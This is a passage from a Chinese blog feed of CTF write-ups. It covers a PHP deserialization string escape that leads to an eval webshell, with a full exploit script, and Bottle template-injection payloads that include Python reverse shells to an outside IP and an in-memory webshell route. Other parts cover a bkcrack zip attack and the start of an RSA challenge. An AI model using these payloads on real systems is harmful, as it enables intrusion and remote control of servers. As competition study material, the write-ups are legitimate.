class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;||&quot;</span>,<span class="string">&quot;&amp;&amp;&quot;</span>,<span class="string">&quot;select&quot;</span>,<span class="string">&quot;union&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$lists</span> <span class="keyword">as</span> <span class="variable">$list</span>)&#123;</span><br><span class="line">        <span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$list</span>,<span class="string">&quot;error&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#echo $c;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看这个<code>waf</code>就知道是<strong>字符串逃逸</strong>了，看一下后面的死亡绕过，必须要拿到<code>isadmin=1</code>，因为有别的什么签名秘钥之类的操作，所以我们是登不上<code>admin</code>账号的，但我们可以通过<strong>用户名的字符串逃逸</strong>实现我们要的<code>isadmin=1</code>，有这个足矣</p><p>根据<code>User类</code>我们可以手搓一下它的<strong>序列化数据</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isadmin&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"></span><br><span class="line">因为我们不是真正的admin，所以要在用户名这里使isadmin=<span class="number">1</span>，即用户名后追加 <span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:1;&#125;，这里有21个字符，需要使用flag逃逸21次，变成下面的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:105:&quot;</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:1;&#125;&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isadmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">error替换后，后面的 <span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:0;&#125;就会逃逸出去，不起作用</span></span><br></pre></td></tr></table></figure><p>所以我们的用户名直接就是，<code>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code>，然后拿这个用户名去随便注册就可以了</p><p>同时，<code>dashboard.php</code>这里还有个<a href="https://xiaolong22333.top/archives/114/">php死亡绕过</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 示例：验证并读取 Cookie</span></span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">checkSignedCookie</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userData</span>) &#123;</span><br><span class="line">    <span class="comment">#echo $userData;</span></span><br><span class="line">    <span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$userData</span>);</span><br><span class="line">    <span class="comment">#var_dump($user);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;isadmin)&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]||<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token验证失败&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>filename=php://filter//convert.base64-decode/resource=/var/www/html/shell.php</code><br><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code>，作用就是将<code>&lt;?php exit(); ?&gt;.$content</code>进行<code>base64编码</code>后写入文件<code>shell.php</code>中，因为<code>phpexita</code>会被进行<code>base64解码</code>成<code>php</code>无法识别的内容而<strong>无法解析</strong>，但是<code>PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg==</code>的<code>base64解码</code>成<code>&lt;?php eval($_POST[1]);?&gt;</code>被<strong>php解析执行</strong></p><p>最后就是，连接木马，读取<code>flag</code>的操作了</p><p>官方给了自动化脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;register.php&quot;</span>, data=data)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_response = session.post(url+<span class="string">&quot;login.php&quot;</span>, data=data)</span><br><span class="line">    shell = &#123;<span class="string">&quot;filename&quot;</span>: <span class="string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/shell.php&quot;</span>,<span class="string">&quot;txt&quot;</span>:<span class="string">&quot;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==&quot;</span>&#125;</span><br><span class="line">    protected_response = session.post(url+<span class="string">&quot;dashboard.php&quot;</span>, data=shell)</span><br><span class="line">    response = requests.post(url+<span class="string">&quot;shell.php&quot;</span>, data=&#123;<span class="string">&quot;123&quot;</span>: <span class="string">&quot;system(&#x27;cat / flag&#x27;)&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://node2.anna.nssctf.cn:28932/&quot;</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure><h2 id="Message-in-a-Bottle"><a href="#Message-in-a-Bottle" class="headerlink" title="Message in a Bottle"></a>Message in a Bottle</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, template, run</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储留言的列表</span></span><br><span class="line">messages = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_message</span>(<span class="params">message</span>):</span><br><span class="line">    message_items = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;message-card&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-content&quot;&gt;<span class="subst">&#123;msg&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;small class=&quot;message-time&quot;&gt;#<span class="subst">&#123;idx + <span class="number">1</span>&#125;</span> - 刚刚&lt;/small&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> <span class="keyword">for</span> idx, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(message)])</span><br><span class="line"></span><br><span class="line">    board = <span class="string">f&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;简约留言板&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;link href=&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;d-flex justify-content-between align-items-center mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1 class=&quot;mb-0&quot;&gt;📝 简约留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;a </span></span><br><span class="line"><span class="string">                    href=&quot;/Clean&quot; </span></span><br><span class="line"><span class="string">                    class=&quot;btn btn-danger&quot;</span></span><br><span class="line"><span class="string">                    onclick=&quot;return confirm(&#x27;确定要清空所有留言吗？此操作不可恢复！&#x27;)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                    🗑️ 一键清理</span></span><br><span class="line"><span class="string">                &lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/submit&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;textarea </span></span><br><span class="line"><span class="string">                    name=&quot;message&quot; </span></span><br><span class="line"><span class="string">                    placeholder=&quot;输入payload暴打出题人&quot;</span></span><br><span class="line"><span class="string">                    required</span></span><br><span class="line"><span class="string">                &gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;button type=&quot;submit&quot; class=&quot;btn-custom&quot;&gt;发布留言&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-list mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-flex justify-content-between align-items-center mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h4 class=&quot;mb-0&quot;&gt;最新留言（<span class="subst">&#123;<span class="built_in">len</span>(message)&#125;</span>条）&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    <span class="subst">&#123;<span class="string">f&#x27;&lt;small class=&quot;text-muted&quot;&gt;点击右侧清理按钮可清空列表&lt;/small&gt;&#x27;</span> <span class="keyword">if</span> message <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                <span class="subst">&#123;message_items&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> board</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message.replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Clean&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clean</span>():</span><br><span class="line">    <span class="keyword">global</span> messages</span><br><span class="line">    messages = []</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/&quot;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    message = waf(request.forms.get(<span class="string">&#x27;message&#x27;</span>))</span><br><span class="line">    messages.append(message)</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run(app, host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">9000</span>)</span><br></pre></td></tr></table></figure><p>审一下代码，发现有<strong>过滤花括号</strong>的<code>waf</code>，以及<code>template</code><strong>模板渲染</strong></p><p>试了一下，发现可以<code>xss</code>，并且内容留在了前端页面上，话说<code>xss</code>这种打法除了<strong>cookie外带</strong>这种我好像没见过什么其他操作了()</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;message-time&quot;</span>&gt;</span>#1 - 刚刚<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;message-time&quot;</span>&gt;</span>#2 - 刚刚<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以考虑闭合<code>&lt;/div&gt;</code>，题目用是<code>bottle</code>，不妨看看有没有<strong>bottle模板注入</strong></p><p>看一下<a href="https://googlegroups.com/group/bottlepy/attach/60ddc96375306a0e/bottle-zh-cn.pdf?part=0.1">官方文档</a>，可以嵌入<strong>python代码</strong>，以<code>%</code>开始</p><p>所谓闭合，就是我们自己填上里面的<code>&lt;div&gt;</code>的后半部分使得最外面的<code>&lt;div&gt;</code>成为完整的一部分，然后剩下的<code>&lt;/div&gt;</code>我们需要补上它的<code>&lt;div&gt;头</code>，然后我们就可以在二者之间插入我们的<strong>恶意python代码</strong>了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat /flag &gt; 1.txt&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%include(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我想试试反弹shell，直接找了一个payload，好像失败了</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;8.x.x.x&#x27;,2333));[os.dup2(s.fileno(),i) for i in range(3)];p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])&quot;</span></span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面两个是官方payload</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;8.x.x.x\&quot;,2333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)&#x27;&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存马</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">% from bottle import Bottle, request</span><br><span class="line">% app=__import__(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br><span class="line">% app.route(<span class="string">&quot;/shell&quot;</span>,<span class="string">&quot;GET&quot;</span>,lambda :__import__(<span class="string">&#x27;os&#x27;</span>).popen(request.params.get(<span class="string">&#x27;cmd&#x27;</span>)).<span class="built_in">read</span>())</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br></pre></td></tr></table></figure><p><a href="https://forum.butian.net/share/4048">内存马</a></p><p>是需要闭合的吧，但是出题人那好像没写</p><h2 id="Message-in-a-Bottle-plus"><a href="#Message-in-a-Bottle-plus" class="headerlink" title="Message in a Bottle plus"></a>Message in a Bottle plus</h2><p>是个黑盒题，发现了<code>%</code>直接就触发了<code>waf</code>，然后出题人这里说是，白名单之后加了一些<code>AST</code>的语法检测，在我们语法报错的时候会变量替换</p><p>在<code>python</code>里<code>% xxx</code>这本身就是一个错误的语法，为了让它可以通过语法检测(然而语法检测这种东西肯定针对的是代码)，将它变成<strong>字符串</strong>就可以了，所以用引号包裹就可以绕过<code>AST</code>的检测</p><p><code>payload</code>的话，这里好像只有<strong>内存马</strong>生效了，其他的可以多试几次就可以了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">% from bottle import Bottle, request</span></span><br><span class="line"><span class="string">% app=__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]</span></span><br><span class="line"><span class="string">% app.route(&quot;/shell&quot;,&quot;GET&quot;,lambda :__import__(&#x27;os&#x27;).popen(request.params.get(&#x27;cmd&#x27;)).read())</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="mybrave"><a href="#mybrave" class="headerlink" title="mybrave"></a>mybrave</h2><p>先爆破一下密码，发现好像爆不出来，然后注意到压缩包里面是图片，使用<strong>bkcrack进行已知明文攻击</strong>(这里是符合攻击条件的)，因为<strong>png头是固定的</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -x 0 89504E470D0A1A0A0000000D49484452</span><br><span class="line"></span><br><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -k 97d30dcc 173b15a8 6e0e7455 -r 1..12 ?p</span><br><span class="line"></span><br><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -k 97d30dcc 173b15a8 6e0e7455 -d mybrave.png</span><br></pre></td></tr></table></figure><p>一开始爆12位密码无果，还是直接恢复出来吧<br>提取图片尾的字符<strong>解base64</strong>即可</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://seandictionary.top/ghctf-2025/">https://seandictionary.top/ghctf-2025/</a></li><li><a href="https://tover.xyz/">https://tover.xyz/</a></li><li><a href="https://tangcuxiaojikuai.xyz/">https://tangcuxiaojikuai.xyz/</a></li><li><a href="https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/">https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/</a></li><li><a href="https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw">https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw</a></li><li><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">https://www.cnblogs.com/EddieMurphy-blogs/p/18296185</a></li><li><a href="https://xyaxxya.github.io/posts/2b7eb6e9.html">https://xyaxxya.github.io/posts/2b7eb6e9.html</a></li><li><a href="https://hyggevv.github.io/2025/03/07/GHCTF2025">https://hyggevv.github.io/2025/03/07/GHCTF2025</a></li></ul><p>唉，也只能四处抄抄学学了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;诶，这里有老登偷偷炸鱼(bushi&lt;/p&gt;
&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;p&gt;无意中发现了一个&lt;strong&gt;在线Sagemath运行平</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>国城杯&amp;&amp;HECTF2024</title>
    <link href="https://hvang10.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/"/>
    <id>https://hvang10.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/</id>
    <published>2024-12-08T15:48:30.000Z</published>
    <updated>2025-04-10T15:19:27.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="国城杯"><a href="#国城杯" class="headerlink" title="国城杯"></a>国城杯</h1><p>这次比赛的<code>web</code>比较有难度(题解居然比<code>pwn</code>少，而且是少很多很多)，交给学弟，然后学弟下午出去玩，那就没人打<code>web</code>了，因为我被<code>圆锥曲线</code>卡住了QWQ</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;D0g3xGC&#123;****************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">p, q</span>):</span><br><span class="line">    public_key = p*p*q</span><br><span class="line">    e = public_key</span><br><span class="line">    n = p*q</span><br><span class="line">    phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    private_key = inverse(e,phi_n)</span><br><span class="line">    <span class="keyword">return</span> public_key,private_key,e</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">N,d,e = gen_key(p,q)</span><br><span class="line"></span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span></span><br><span class="line"><span class="string">d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span></span><br><span class="line"><span class="string">c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>Schmidt Samoa</code>密码体系，见<a href="https://hvang10.github.io/2024/05/10/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/">crypto-week4-RSA Variation II</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span></span><br><span class="line">d = <span class="number">58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span></span><br><span class="line">c = <span class="number">82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span></span><br><span class="line">pq = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, d*N, N)-<span class="number">2</span>, N)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, pq))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="EZ-sign"><a href="#EZ-sign" class="headerlink" title="EZ_sign"></a>EZ_sign</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span 